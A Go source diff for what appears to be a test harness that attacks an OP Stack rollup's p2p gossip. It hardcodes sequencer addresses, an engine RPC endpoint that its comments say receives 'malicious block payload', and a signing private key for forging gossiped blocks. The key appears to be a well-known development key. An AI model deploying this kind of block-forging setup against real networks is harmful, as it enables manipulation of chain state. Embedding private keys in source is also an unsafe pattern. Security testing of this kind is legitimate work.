@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/hex"
 	"encoding/json"
-	"flag"
 	"fmt"
 	"log"
 	"math/big"
@@ -18,14 +17,37 @@ import (
 	ma "github.com/multiformats/go-multiaddr"
 )
 
-func fetchSequencerPeerAddressInfo(rpcURL, p2pAddr string) (*peer.AddrInfo, error) {
+const (
+	// Where to bind this services p2p listener address to
+	p2pListenerAddress = "/ip4/0.0.0.0/tcp/9005"
+
+	// Sequencer address to ask for their peer id
+	sequencerRpcAddress = "http://op-node-sequencer:9545"
+
+	// Sequencer p2p address, to connect to after discovering their peer id
+	sequencerP2PAddress = "/dns4/op-node-sequencer/tcp/9003"
+
+	// Full node engine rpc used sending malicious block payload to
+	opFullNodeEngineRpc = "http://op-geth-fullnode:8552"
+
+	// Jwt token path
+	jwtPath = "/config/jwt.txt"
+
+	// L2 chain id for rollup
+	l2ChainId = 22_266_222
+
+	// Sequencer private key, used for signing modified gossiped messages
+	sequencerPrivateKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
+)
+
+func fetchSequencerPeerAddressInfo() (*peer.AddrInfo, error) {
 	body, _ := json.Marshal(map[string]any{
 		"jsonrpc": "2.0",
 		"method":  "opp2p_self",
 		"params":  []any{},
 		"id":      1,
 	})
-	resp, err := http.Post(rpcURL, "application/json", bytes.NewReader(body))
+	resp, err := http.Post(sequencerRpcAddress, "application/json", bytes.NewReader(body))
 	if err != nil {
 		return nil, err
 	}
@@ -43,7 +65,7 @@ func fetchSequencerPeerAddressInfo(rpcURL, p2pAddr string) (*peer.AddrInfo, erro
 		return nil, fmt.Errorf("empty peerID in response")
 	}
 
-	multiAddress, err := ma.NewMultiaddr(fmt.Sprintf("%s/p2p/%s", p2pAddr, result.Result.PeerID))
+	multiAddress, err := ma.NewMultiaddr(fmt.Sprintf("%s/p2p/%s", sequencerP2PAddress, result.Result.PeerID))
 	if err != nil {
 		return nil, err
 	}
@@ -51,45 +73,29 @@ func fetchSequencerPeerAddressInfo(rpcURL, p2pAddr string) (*peer.AddrInfo, erro
 }
 
 func main() {
-	seqRPC := flag.String("sequencer-rpc", "", "sequencer op-node RPC URL to discover peer ID (e.g. http://op-node-sequencer:9545)")
-	seqP2PAddr := flag.String("sequencer", "", "sequencer p2p address without peer ID (e.g. /dns4/op-node-sequencer/tcp/9003)")
-	listenAddr := flag.String("listen", "/ip4/0.0.0.0/tcp/9005", "listen multiaddr")
-	chainIDStr := flag.String("chain-id", "", "L2 chain ID (e.g. 901)")
-	signerKeyHex := flag.String("signer-key", "", "sequencer p2p signing private key (hex)")
-	engineRPC := flag.String("engine-rpc", "", "engine API URL for building replacement blocks (e.g. http://op-geth-fullnode:8551)")
-	engineJWT := flag.String("engine-jwt", "", "path to JWT secret file for engine API")
-	flag.Parse()
+	chainId := big.NewInt(l2ChainId)
 
-	if *seqRPC == "" || *seqP2PAddr == "" || *chainIDStr == "" || *signerKeyHex == "" || *engineRPC == "" || *engineJWT == "" {
-		log.Fatal("--sequencer-rpc, --sequencer, --chain-id, --signer-key, --engine-rpc, and --engine-jwt are required")
-	}
-
-	signerKey, err := gethcrypto.HexToECDSA(strings.TrimPrefix(*signerKeyHex, "0x"))
+	signerKey, err := gethcrypto.HexToECDSA(strings.TrimPrefix(sequencerPrivateKey, "0x"))
 	if err != nil {
 		log.Fatalf("invalid --signer-key: %v", err)
 	}
 
-	jwtRaw, err := os.ReadFile(*engineJWT)
+	jwtBytes, err := os.ReadFile(jwtPath)
 	if err != nil {
 		log.Fatalf("read --engine-jwt: %v", err)
 	}
-	jwtSecret, err := hex.DecodeString(strings.TrimSpace(strings.TrimPrefix(string(jwtRaw), "0x")))
+	jwtSecret, err := hex.DecodeString(strings.TrimSpace(strings.TrimPrefix(string(jwtBytes), "0x")))
 	if err != nil {
 		log.Fatalf("decode jwt secret: %v", err)
 	}
 
-	chainId, ok := new(big.Int).SetString(*chainIDStr, 10)
-	if !ok {
-		log.Fatalf("invalid --chain-id: %s", *chainIDStr)
-	}
-
-	seqAddrInfo, err := fetchSequencerPeerAddressInfo(*seqRPC, *seqP2PAddr)
+	seqAddrInfo, err := fetchSequencerPeerAddressInfo()
 	if err != nil {
 		log.Fatalf("failed to fetch sequencer addr info: %v", err)
 	}
 	log.Printf("discovered sequencer peer ID: %s", seqAddrInfo.ID)
 
-	p2p := NewP2P(*engineRPC, jwtSecret, signerKey, *listenAddr, chainId, seqAddrInfo)
+	p2p := NewP2P(opFullNodeEngineRpc, jwtSecret, signerKey, p2pListenerAddress, chainId, seqAddrInfo)
 
 	http.HandleFunc("/peer-id", func(w http.ResponseWriter, r *http.Request) {
 		fmt.Fprint(w, p2p.libp2pServer.ID().String())
